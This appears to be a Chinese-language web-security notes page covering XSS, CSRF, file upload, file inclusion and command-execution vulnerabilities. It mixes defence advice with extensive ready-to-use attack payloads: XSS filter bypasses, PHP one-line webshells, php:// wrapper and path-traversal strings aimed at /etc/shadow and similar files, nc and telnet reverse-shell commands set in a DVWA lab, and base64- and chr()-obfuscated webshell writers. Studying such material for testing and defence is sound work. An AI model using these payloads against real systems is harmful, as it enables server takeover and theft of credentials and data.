+    &lt;video src=&quot;http://www.0dutv.com/plug/down/up2.php/104678898.mp3&quot; onprogress=(′body′).prepend(123);(&apos;body&apos;)&gt;&lt;/video&gt;
+
+&gt; 符号绕过
+    替换空格：%a0,%0d,/**/
+    截断：%00
+    替换括号：` `
+
+&gt; 空格绕过
+    &lt;a href=&quot;javasr    ipt:alert(1);&quot;&gt;&lt;/a&gt;
+
+&gt; 双写绕过
+    &lt;img ononerrorerror=&quot;123&quot;&gt;
+    &lt;scscriptript&gt;alalertert(123)&lt;/scrscriptpt&gt;
+
+&gt; 事件绕过
+    onload
+    onclick
+    onerror
+    prompt
+    confirm
+    onmousemove
+
+&gt; CRLF injection绕过
+    CRLF是”回车 + 换行”（\r\n）的简称。
+    http://www.xxx.com%0d%0a%0d%0a&lt;svg/onload=prompt(1)&gt;</code></pre><h3 id="xss的防御措施"><a href="#xss的防御措施" class="headerlink" title="xss的防御措施"></a>xss的防御措施</h3><pre><code>&gt; httponly
+    浏览器将禁止页面的javascript访问带有httponly属性的cookie。
+&gt; 输入输出检查
+    1.输入输出的检查应放在服务器端，否则很容易被绕过，最好服务器和客户端都进行检查，一般是检查用户输入的数据是否包含一些特殊字符或者javascript的敏感字符，如&lt;,&gt;,“,script,on,如果存在则过滤掉
+    2.使用安全的编码函数，如在html标签中使用HTMLEncode函数,在javascript的标签和事件中使用JavascriptEndcode函数,在css的输出中使用encodeForCSS函数,在地址输出中使用URLEncode函数
+    3.防御dom型xss方法：输出到&lt;script&gt;时，先使用encodeForJavaScript对其编码。然后在doucment.write()方法中做判断，如果是输出到HTML 页面，则再使用encodeForHTML二次编码；如果是输出到JavaScript则使用encodeForJavaScript二次编码。
+    4.黑白名单
+    5.cookie中设置http-only，防止cookie劫持
+    6.确保执行的脚本可信任(CSP策略)
+    7.不使用有缺陷的第三方库</code></pre><h3 id="html实体字符转换"><a href="#html实体字符转换" class="headerlink" title="html实体字符转换"></a>html实体字符转换</h3><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a><br><a href="http://tool.chinaz.com/tools/htmlencode.aspx">http://tool.chinaz.com/tools/htmlencode.aspx</a></p>
+<h3 id="xss漏洞检测工具"><a href="#xss漏洞检测工具" class="headerlink" title="xss漏洞检测工具"></a>xss漏洞检测工具</h3><pre><code>XSStrike</code></pre><h3 id="xss备忘录"><a href="#xss备忘录" class="headerlink" title="xss备忘录"></a>xss备忘录</h3><p><a href="http://momomoxiaoxi.com/2017/10/10/XSS">http://momomoxiaoxi.com/2017/10/10/XSS</a></p>
+<h3 id="xss-payload大全"><a href="#xss-payload大全" class="headerlink" title="xss payload大全"></a>xss payload大全</h3><p><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</a></p>
+<h2 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h2><h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><pre><code>CSRF(Cross-site request forery,跨站请求伪造)攻击原理是网站通过隐式认证用户时，只要不关闭浏览器或者退出，以后访问相同网站时，浏览器会自动在请求中附带认证信息。如果浏览器被其他网页控制请求了这个url，那么可能会执行一些用户不希望的功能。利用用户的合法身份，以目标用户的名义进行非法操作。
+如：
+1.用户C打开浏览器访问受信网站A，输入用户名和密码登录网站A
+2.在成功验证用户信息后，网站A产生cookie信息保存在本地并返回给浏览器，此时用户登录网站A成功
+3.用户在未退出网站A前，在同一浏览器中，访问了带有恶意代码的网站B
+4.网站B收到用户C的请求后，并发出了一个请求请求访问网站A
+5.浏览器收到了恶意代码后，根据网站B的请求，在用户不知情的情况下，带着用户的cookie访问了网站A，网站A并不知道请求是由带有恶意代码的网站B发起，所以会根据用户C的coookie信息以及请求内容处理该请求，导致来自网站B的恶意代码被执行。</code></pre><h3 id="csrf的漏洞检测"><a href="#csrf的漏洞检测" class="headerlink" title="csrf的漏洞检测"></a>csrf的漏洞检测</h3><pre><code>最简单的方法就是抓取一个正常的请求，去掉Referer字段后重新提交，如果该提交还有效，则存在csrf
+检测工具有：CSRFTester，CSRF Request Builder</code></pre><h3 id="csrf绕过referer"><a href="#csrf绕过referer" class="headerlink" title="csrf绕过referer"></a>csrf绕过referer</h3><pre><code>&gt; 原理
+    HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上referer，告诉服务器我是从哪个页面链接过来的，服务器可以借此获得一些信息用于处理。当用户点击被构造好的csrf利用页面，那么在执行用户对应操作时，提交的http请求中就有对应的referer值，此时服务器判断referer值是否与服务器的域名信息有关，如果不相关则不执行操作。
+&gt; 方法
+    1.referer条件为空条件时
+        利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。
+        利用data:协议,bese64编码,解码即可看到代码,利用https协议,https向http跳转的时候Referer为空
+    2.判断Referer是某域情况下绕过
+    比如你找的csrf是xxx.com,验证的referer是验证的*.xx.com  
+    可以找个二级域名之后在把文章地址发出去就可以伪造
+    3.判断referer是否存在某关键字
+    referer判断存在不存在google.com这个关键词,在网站新建一个google.com目录,把CSRF存放在google.com目录,即可绕过
+    4.判断referer是否含有某域名
+    同理，在网站新建一个相同的域名目录,把CSRF存放在域名目录里,即可绕过</code></pre><h3 id="csrf的利用方法"><a href="#csrf的利用方法" class="headerlink" title="csrf的利用方法"></a>csrf的利用方法</h3><pre><code>&gt; JSONP
+&gt; CORS
+参考资料：https://www.freebuf.com/column/207802.html</code></pre><h3 id="csrf的防御措施"><a href="#csrf的防御措施" class="headerlink" title="csrf的防御措施"></a>csrf的防御措施</h3><ol>
+<li>提交验证码<br> 验证码防御是一种二次验证，被认为是对抗csrf最简单且有效的防御方法。csrf是在用户不知情的情况下完成的对应操作，而验证码强制用户与服务器应用进行交互，才能完成操作，但是处于对用户体验的考虑，不可能每一个操作都加入验证码，所以验证码只是作为辅助手段。</li>
+<li>referer check<br> referer check主要是用于防止盗链，也可以用来检查请求是否来自合法的源，如果referer不是当前系统的域就极有可能受到csrf的攻击，同时从http跳转到https时服务器无法获取到referer值。</li>
+<li>token防御<br> 在HTTP请求中以参数的形式添加一个随机产生的Tokend，并在服务器建立一个拦截器来验证这个Token，假设请求中没有这个Token或者Token的内容不对，则被认定为是csrf攻击而拒绝该请求。同时Token的值要足够随机，以及用POST传参。</li>
+</ol>
+<h3 id="csrf和xss的区别"><a href="#csrf和xss的区别" class="headerlink" title="csrf和xss的区别"></a>csrf和xss的区别</h3><ol>
+<li>csrf需要登录后操作，xss不需要</li>
+<li>xss只要是针对客户端，csrf针对服务器</li>
+<li>xss是利用合法用户获取其信息，csrf是伪造成合法用户发送请求</li>
+<li>xss产生的主要原因是用户没有正确过滤，csrf产生的主要原因是采用的隐式的认证</li>
+</ol>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="文件上传漏洞定义"><a href="#文件上传漏洞定义" class="headerlink" title="文件上传漏洞定义"></a>文件上传漏洞定义</h3><pre><code>文件上传漏洞是指用户传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。如果服务器的处理逻辑不够安全，没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传人员PHP文件，能够将这些PHP文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本，会导致严重的后果。</code></pre><h3 id="文件上传漏洞产生原因"><a href="#文件上传漏洞产生原因" class="headerlink" title="文件上传漏洞产生原因"></a>文件上传漏洞产生原因</h3><pre><code>* 服务器配置不当
+* 开源编辑器上传漏洞
+* 本地文件上传限制被绕过
+* 过滤不严或绕过
+* 文件解析漏洞导致文件执行
+* 文件路径被截断</code></pre><h3 id="文件上传漏洞绕过方式"><a href="#文件上传漏洞绕过方式" class="headerlink" title="文件上传漏洞绕过方式"></a>文件上传漏洞绕过方式</h3><pre><code>&gt; 客户端绕过
+    删除前端判断的js或者利用burp抓包改包，先上传一个gif/png/jpeg类型的木马，然后通过burp将其改成为asp/php/jsp后缀名
+&gt; 服务端绕过
+    1. 黑名单扩展绕过
+        * 找黑名单扩展名的漏网之鱼，如 iis6.0中的asa和cer扩展类型
+        * 找可能存在大小写绕过的漏洞
+        * 能被web容器解析的文件及其扩展名列表，如jsp，jspx，jspf，asp，asa，cer，cdx，htr，xml，html,php,pHP,php3,php4,exe,exee
+    2. 在windows系统下，如果文件名以&quot;.&quot;或者空格作为结尾，系统会自动删除&quot;.&quot;与空格，利用此特性也可以绕过黑名单验证。apache中可以利用点结尾和空格绕过。
+    3. 单双重后缀名绕过
+        利用burp抓包改包，把文件名后缀.php改成.phphph，那么过滤了第一个&quot;php&quot;字符串后，开头的&quot;ph&quot;和结尾的&quot;p&quot;结合成了&quot;php&quot;
+    4. 服务端MIME文件类型绕过
+        MIME是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。
+        * 常用类型如下：
+            text/plain（纯文本）
+            text/html（HTML 文档）
+            text/javascript（js 代码）
+            application/xhtml+xml（XHTML 文档）
+            image/gif（GIF 图像）
+            image/jpeg（JPEG 图像）
+            image/png（PNG 图像）
+            video/mpeg（MPEG 劢画）
+            application/octet-stream（二迚制数据）
+            application/pdf（PDF 文档）
+            application/(编程语言) 该种语言癿代码
+            application/msword（Microsoft Word 文件）
+            message/rfc822（RFC 822 形式）
+            multipart/alternative（HTML 邮件癿 HTML 形式和纯文本形式，相同内容使
+            用丌同形式表示）
+            application/x-www-form-urlencoded（POST 方法提交癿表单）
+            multipart/form-data（POST 提交时伴随文件上传癿表单）
+        * 绕过方法：
+            利用burp抓包改包对Content-type类型做修改，如Content-type:text/plain改成Content-type:image/jpeg
+    5. 配合文件包含漏洞绕过
+        * 运行上传文件包含脚本和一句话木马
+            前提：校验规则只校验文件后缀名为asp/jsp/php的内容是否为木马
+            （1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
+            （2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;
+        * 存在本地文件包含漏洞并且可以上传一句话木马
+            上传一个符合条件格式癿文档，文档内容为一句话木马，eg：test.txt
+            利用文件包含漏洞包含上传癿木马文件,eg:page?id=D:/www/test.txt
+&gt; 白名单绕过
+    1.配合web容器的解析漏洞
+        * IIS6.0目录解析漏洞和分号解析漏洞
+            将一句话木马文件名.php改成.php.abc，或者改成.php;*.jpg。因为IIS识别不出后缀，默认使用第一个后缀。
+        * Nginx0.5.*, 0.6.*, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37空字节漏洞
+            Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码
+        * Apache2.4.0到2.4.29解析漏洞
+            上传如a.php.rar，a.php.gif类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右到左读的，如果遇到不能识别的扩展名则会跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php
+    2. %00截断绕过(php版本&lt;5.3.4)
+        通过burp抓包改包，将.php.jpg后面的.换%00，即.php%00.jpg，当文件系统读到%00时，会认为文件已经结束，从而将.php.jpg的内容写到.php中去，但是必须存在截断上传漏洞才能用。
+    3. 条件竞争绕过
+        * 网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。
+        * 网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。
+        * 在删除之前访问上传的php文件，从而执行上传文件中的php代码。
+        那么    利用时间差写脚本木马不断上传，总有一次可以上传成功
+    4. windows下特殊名
+        shell.php.  --&gt;  shell.php
+        shell.php::$DATA  --&gt;  shell.php
+        shell.php::NTFS  --&gt;  shell.php
+&gt; 带waf的文件上传绕过
+    1. 上传文件检查的位置
+        * 文件名：解析文件名，判断是否在黑名单内
+        * 文件内容：解析文件内容，判断是否是webshell
+        * 文件目录
+        * url
+        * MIME文件类型
+    2. 填充垃圾数据绕过
+        有些waf软件为了不影响web服务器的性能，会对校验的用户数据设置大小上。那么这种情况可以构造一个大文件，前面的内容为垃圾内容，后面的才是木马内容。比如在Content-Type类型，Content-Disposition数据前后添加垃圾数据a=111111111111111111111111111。
+    3. filename绕过
+        * 添加一个filename参数
+        * 将filename的位置与name位置交换    * 在filename后面加空格
+        * form-data字段与name字段交换位置
+    4. POST/GET更改方法绕过
+        有写waf的规则是如果数据包参数类型为post，则校验数据包里面的内容，所以可以上传一个post型的数据包然后利用burp抓包改包将post改为get
+    5. 删除实体里面的Content-type字段如果
+        * 删除整行content-disposition
+        * 删除c后面的字符，然后将.php跟在c后面变成c.php，注意双引号要跟着c.php
+        * 删除content-disposition里面空格
+        * 添加多个不同的content-disposition字段
+    6. 文件重命名绕过
+        将filename参数中的文件重命名，增加足够长的字段，如shell.php;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.....jpg
+    7. windows特殊字符绕过
+        当我们上传一个文件的filename为shell.php(%80-%99)时可绕过
+    8. exee扩展名绕过
+        如果上.exe文件被waf拦截，则可以将后缀改成.exee
+    9. 多个分号绕过
+        当waf遇到name=&quot;file&quot;;;时，认为没有解析到filename，而后容器继续解析到文件名是shell.php，则导致绕过
+    10. 图片马配合解析漏动绕过
+        &lt;script language=&quot;php&quot;&gt;@eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;
+        * windows下使用 copy 1.jpg/b + 1.php/a 2.jpg 生图片马
+        * 中间件的解析漏洞
+        * 文件包含 + php伪协议
+            ?file=zip://[zip文件路径]#[压缩包内文件名]
+            ?file=php://filter/read=convert.base64-decode/resource=shell.jpg
+            ?file=phar://shell.rar/shell.jpg</code></pre><h3 id="文件上传漏洞防御措施"><a href="#文件上传漏洞防御措施" class="headerlink" title="文件上传漏洞防御措施"></a>文件上传漏洞防御措施</h3><pre><code>1. 配置好服务器
+2. 及时更新补丁修复漏洞
+3. 在服务器后端对上传的文件进行过滤
+4. 设置文件上传的目录为不可执行
+5. 判断文件类型，结合MIME Type，后缀检查等方式，白名单过滤以及对于图片处理使用压缩函数或者resize函数
+6. 使用随机数改写文件名和文件路径
+7. 单独设置文件服务器域名，解决因为同源策略而出现的上传crossdomain.xml，包含javascript的xss利用等问题</code></pre><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><h3 id="任意文件读取漏洞原理"><a href="#任意文件读取漏洞原理" class="headerlink" title="任意文件读取漏洞原理"></a>任意文件读取漏洞原理</h3><pre><code>由于程序员没有对客户端传入的参数进行合法性的校验，导致可以任意读取服务器上部分或者全部文件的漏洞，攻击者利用此漏洞可以读取服务器上敏感文件，导致意外的文件泄露。</code></pre><h3 id="敏感目录路径"><a href="#敏感目录路径" class="headerlink" title="敏感目录路径"></a>敏感目录路径</h3><pre><code>&gt; windows环境
+    c:\boot.ini // 查看系统版本
+    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
+    c:\windows\repair\sam // 存储Windows系统初次安装的密码
+    c:\ProgramFiles\mysql\my.ini // MySQL配置
+    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
+    c:\windows\php.ini // php 配置信息
+&gt; linux环境
+    etc/passwd // 账户信息
+    /etc/shadow // 账户密码文件
+    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+    /usr/local/app/php5/lib/php.ini // PHP相关配置
+    /etc/httpd/conf/httpd.conf // Apache配置文件
+    /etc/my.conf // mysql 配置文件</code></pre><h3 id="任意文件读取漏洞利用方式"><a href="#任意文件读取漏洞利用方式" class="headerlink" title="任意文件读取漏洞利用方式"></a>任意文件读取漏洞利用方式</h3><pre><code>* 读取程序源代码（如密码配置文件）
+* 读取程序配置文件（如数据库连接文件）
+* 读取操作系统关键文件（如/etc/passwd,/root/history)
+* 读取运维配置文件(redis/rsync/ftp/ssh客户端数据)
+* 读取中间件配置文件（weblogic/tomact,/ect/httpd/conf/htrpd.conf）
+* 下载web日志文件</code></pre><h3 id="任意文件读取方式"><a href="#任意文件读取方式" class="headerlink" title="任意文件读取方式"></a>任意文件读取方式</h3><pre><code>文件包含漏洞
+&gt; 文件包含漏洞原理
+    服务器执行PHP文件时，文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，通过文件包含函数加载另一个文件中的PHP代码，包含其他恶意文件，并且当PHP来执行，导致了执行了非预期的代码
+&gt; 产生文件包含漏洞的函数
+    * require：函数出现错误时，会直接报错并且退出程序
+    * require_once：出错时退出，且只包含一次
+    * include：函数出现错误时，会抛出警告然后继续运行
+    * include_once：出现错误时，会抛出警告，且只包含一次
+    include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。
+    而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。
+&gt; 文件包含漏洞产生条件
+    * web 应用采用include等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入
+    * 用户能够控制包含文件的参数，被包含的文件可被当前页面访问
+&gt; 文件包含漏洞获取webshell的条件
+    * 用户需要知道文件存放的物理路径(D:\temp\test)
+    * 对上传文件的目录有可执行条件
+&gt; 本地文件包含绕过(只要是文件中包含可以解析的php代码php.txt)
+    * %00截断
+        ?filename=../../../etc/pwd%00
+        ?filename=../../../etc.pwd%00.jpg
+        条件：php版本小于5.3，magic_quotes_gpc=off，未对接收的参数进行addslashes进行转义
+    * 路径长度截断
+        ? downfile=../../../etc/pwd/././.[…]/././.
+        条件：windows下点号长度需要长于256，linux下需要长于4096
+    * 点号截断
+        downfile=../../../boot.ini/….[…]………
+        条件：windows下点号长度需要长于256，linux下需要长于4096
+    * 编码绕过
+        Downfile=%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    &gt; 远程文件包含绕过(只要是文件中包含可以解析的php代码php.txt)
+        条件：allow_url_include=on,allow_url_fopen=on
+        * 问号绕过
+            ?filename=http://192.168.255.0/php.txt?
+        * #号绕过
+            ?filename=http://192.168.255.0/php.txt%23
+        * 空格绕过
+            ?filename=http://192.168.255.0/php.txt%20
+        &gt; 伪协议绕过
+            * 利用php://filter(本地文件磁盘读取)
+                ：?filename=php://filter/convert.base64-encode/resource=flag.php
+                条件：allow_url_fopen=on
+            * 利用php://input(读取post数据)
+                碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，如一句话木马&lt;? php $myfile = &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;)) or die(&quot;cant open file&quot;) $payload = &quot;&lt;?php @eval($_POST[&apos;shell&apos;])?&gt;;?&gt;&quot; fwrite($myfile,$payload) fclose($myfile)
+                条件；没有 enctype=&quot; multipart/form-data&quot;,当allow_url_fopen=on,allow_url_include=on(PHP &lt; 5.3.0)时可以任意代码执行
+            * 利用file://伪协议(读取文件内容)
+                ?filename=file://文件路径/文件名
+                条件：要知道文件的绝对路径
+            * 利用data://伪协议(读取文件内容)
+                ?filename=data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4
+                碰到file_get_contents()就要想到用data://绕过
+                条件：当allow_url_fopen=on,allow_url_include=on(PHP &lt; 5.3.0)时可以任意代码执行
+            * 利用phar://伪协议
+                ?filename=phar://压缩包/内部文件
+                条件：PHP &gt; =5.3.0压缩包需要是zip协议压缩，rar不行,写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式
+            * 利用zip://伪协议
+                ?filename=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]  zip://xxx.png#shell.php
+                条件：5.3.0&lt;PHP&lt;5.4</code></pre><h3 id="任意文件读取漏洞防御措施"><a href="#任意文件读取漏洞防御措施" class="headerlink" title="任意文件读取漏洞防御措施"></a>任意文件读取漏洞防御措施</h3><ol>
+<li>对传入的文件名做白名单现在</li>
+<li>对传人的文件路径做好过滤</li>
+<li>禁止传入.,/等通道符</li>
+<li>对目录的访问权限做好限制</li>
+</ol>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><pre><code>应用未对用户的输入做严格的过滤检查，导致用户输入的参数被当成命令来执行。
+linux查看文件的命令：cat、tac、more、less、head、tail、nl、sed、sort、uniq</code></pre><h3 id="命令执行漏洞的危害"><a href="#命令执行漏洞的危害" class="headerlink" title="命令执行漏洞的危害"></a>命令执行漏洞的危害</h3><pre><code>1. 继承web服务程序的权限去执行系统命令或读写文件
+2. 反弹shell，获得目标服务器的权限
+3. 进一步内网渗透</code></pre><h3 id="远程命令执行-代码执行"><a href="#远程命令执行-代码执行" class="headerlink" title="远程命令执行(代码执行)"></a>远程命令执行(代码执行)</h3><pre><code>在PHP中，有时需要调用一些执行命令的函数，如：eval(),assert(),preg_replace(),create_function(),unserialize(),usort(),array_reduce(),${phpinfo()}等，如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就可能存在远程命令执行漏洞。
+&gt; eval()和assert()
+    eval()和assert()函数都可以执行参数内部的代码，且可以接受参数作为字符串。如：
+    &lt;?php @eval($_POST[&apos;shell&apos;]);?&gt;
+    &lt;?php @assert($_POST[&apos;shell&apos;])?&gt;
+    eval()传入的参数必须为php代码，且要以分号结尾；assert()是直接将传入的参数当成PHP代码执行，不需要分号结尾。
+    php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。
+&gt; preg_replace()
+    preg_replace(&apos;正则规则&apos;,&apos;替换字母&apos;,&apos;替换目标&apos;)，如：
+    &lt;?php preg_replace(&quot;/test/e&quot;,$_POST[&apos;shell&apos;],&quot;just test&quot;);?&gt;
+    RCRE修饰符e：preg_replace()在进行了对替换字符串的后向引用替换后，将替换后的字符串作为PHP代码执行，并使用执行解雇作为实际参与替换的字符串。版本在5.5.0之前，5.5.0之后/e修饰符已经被启用了，使用了preg_replace_caliback()代替。而7.7.0以后不再支持/e修饰符，用preg_replace_caliback()代替。
+&gt; array_map()
+    将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后带有新值的数组。如：
+    &lt;?php
+        $func = $_GET[&apos;func&apos;];   //传入自定义函数
+        $cmd = $_POST[&apos;cmd&apos;];     //传入变量
+        $array[0] = $cmd;
+        $new_array = array_map($func,$array);
+        echo $new_array;
+    ?&gt;
+&gt; 动态函数
+    利用动态函数执行php函数可以由字符串拼接而成，如：
+    &lt;?php
+        $a = $_GET[&apos;a&apos;];
+        $b = $_GET[&apos;b&apos;];
+        echo $a($b);
+    ?&gt;
+    // a=assert&amp;b=phpinfo()</code></pre><h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><pre><code>利用PHP的系统命令来执行函数调用系统命令并执行，之类函数有system(),exec(),shell_exec().passthru(),penti_exec(),popen(),proc_pen()等，此外还有反引号` `可以执行命令执行，这种方式实际上是调用shell_exec()来执行。
+&gt; 执行函数
+    1. system()：执行外部程序，并且显示输出
+    2. exec()：执行一个外部程序
+    3. shell_exec()：通过shell环境执行命令，并且将完整的输出以字符串的方式返回
+    4. passthru()：执行unix系统命令并且显示原始输出
+    5. pcntl_exec()：在当前进程空间执行指定程序
+    6. popen()：打开进程文件指针
+    7. proc_open()：执行一个命令，并且打开用来输入/输出的文件指针
+&gt; 执行特殊字符
+    1. cmd1|cmd2：无论cmd1是否执行成功，cmd2都将被执行
+    2. cmd1;cmd2：无论cmd1是否执行成功，cmd2都将被执行
+    3. cmd1||cmd2：仅仅在cmd1执行失败时才会执行cmd2
+    4. cmd1&amp;&amp;cmd2：仅仅在cmd1执行成功后才会执行cmd2
+    5. cmd2$(cmd1)：echo $(whoami)或者$(touch test.sh;echo &apos;ls&apos;&gt;test.sh)
+    6. `cmd`：用于执行特定命令，如`whoami`
+    7. &gt;(cmd)： &lt;(ls)
+    8. &lt;(cmd)： &gt;(ls)</code></pre><h3 id="命令执行反弹shell-以DVWA为例"><a href="#命令执行反弹shell-以DVWA为例" class="headerlink" title="命令执行反弹shell(以DVWA为例)"></a>命令执行反弹shell(以DVWA为例)</h3><ul>
+<li>nc反弹shell:<br>  127.0.0.1;mkfifo /tmp/pipe;sh /temp/pipe|nc -nlp 4444 &gt; /tmp/pipe</li>
+<li>telnet反弹shell<br>  127.0.0.1;rm -f a;mknod a p;telnet 172.26.1.156 6666 0 &lt;a|/bin/bash 1&gt;a</li>
+</ul>
+<h3 id="命令执行写shell-以DVWA为例"><a href="#命令执行写shell-以DVWA为例" class="headerlink" title="命令执行写shell(以DVWA为例)"></a>命令执行写shell(以DVWA为例)</h3><pre><code>1. 127.0.0.1|echo &quot;&lt;?php @eval(\$_POST[&apos;cmd&apos;]);?&gt;&quot;&gt;11.php
+2. 127.0.0.1|echo &quot;&lt;?php (\$_=@\$_GET[2]).@\$_(\$_POST[1])?&gt;&quot;&gt;3.php //2写命令执行函数，1写php命令
+3. 127.0.0.1|`echo PD9waHAgKFwkXz1AXCRfR0VUWzJdKS5AXCRfKFwkX1BPU1RbMV0pPz4= | base64 -d &gt;2326.php`
+4. fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&quot;);  //4要在2的基础上使用
+
+127.0.0.1%0a`echo PD9waHAgKFwkXz1AXCRfR0VUWzJdKS5AXCRfKFwkX1BPU1RbMV0pPz4= %0a base64 -d &gt;2326.php
+/(\||&amp;|;| |\/|cat|flag|ctfhub)
+
+acill码转换后：
+cmd=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(34).chr(57).chr(54).chr(53).chr(46).chr(112).chr(104).chr(112).chr(34).chr(44).chr(34).chr(119).chr(34).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(34).chr(99).chr(109).chr(100).chr(34).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59));
+base64码转换后：
+fputs(fopen(base64_decode(MjcucGhw),w),base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(base64_decode(Vm0weE5GWXhXWGhXYmtwUFZtMW9WMVl3WkRSV1JteFZVMnBTVmsxV2NIaFZNbmhQVm1zeFYxZHVhRlppV0dneldXdGFZV1JHVm5OaFJtaG9UVlZ3VVZkV1dsWmxSazVYVW01S2FGSnNXazlXYlRWRFUxWmFkR1ZHV214U2JIQjVWR3hhYTFkSFNraFZhemxWVm5wV2RscFdXbXRXTVd0NllVWlNUbFl4U2tsV2JURTBZakZSZUZkdVVteFNiVkpXVm01d1YxUXhjRmhsUjBaWFlsVmFTbFl5Y3pGVk1rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9)))))))));</code></pre><h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><pre><code>&gt; 空格过滤
+    &lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
+    $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。
+&gt; 一些命令分隔符
+    linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||
+    windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）
+    1. 在 shell 中，担任”连续指令”功能的符号就是”;”
+    2. &quot;&amp;&quot; 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。
+    3. 管道符&quot;|&quot;左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示
+&gt; 花括号的另类用法
+    在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令，如{ls,}，{cat,flag}等
+&gt; 黑名单绕过
+    1. 拼接绕过，如a=l;b=s;$a$b;，a=fl;b=ag;cat $a$b;
+    2. 编码绕过，如：
+        * base64编吗
+            echo MTIzCg==|base64 -d 其将会打印123
+            echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag
+        * hex编码
+            echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag
+        * oct编码(八进制)
+            $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag
+            $(printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;) &gt;&gt; 1.php
+        * ascii编码
